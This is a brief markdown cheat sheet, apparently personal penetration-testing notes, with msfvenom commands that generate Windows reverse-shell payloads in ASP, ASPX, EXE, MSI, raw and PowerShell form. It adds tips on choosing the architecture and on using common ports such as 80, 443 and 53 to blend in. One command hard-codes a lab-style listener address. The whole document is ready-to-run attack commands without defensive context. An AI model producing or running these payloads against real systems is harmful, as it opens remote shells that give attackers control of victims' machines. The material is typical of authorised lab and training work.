# reverse shells

## tipps

- Specify architecture for windows reverse shells!
- Check windows version if its new its probably x64
- use commen ports such as 80, 443, 53

## general

### list payloads

```bash
msfvenom -l payloads
```

## windows

### generate asp reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=5555 -f asp > shell.asp
```

### generate exe reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=5555 -f exe -o reverse.exe
```

### generate msi reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=5555 -f msi -o reverse.msi
```

### generate windows rev shell without bad chars

```
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=5555 -b "\x00\xotherchars" -f rb
```

### generate aspx reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=80 -f aspx > reverse.aspx
```

### powershell reverse shell

```bash
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.240 LPORT=5555 -f exe -o rev.exe
```
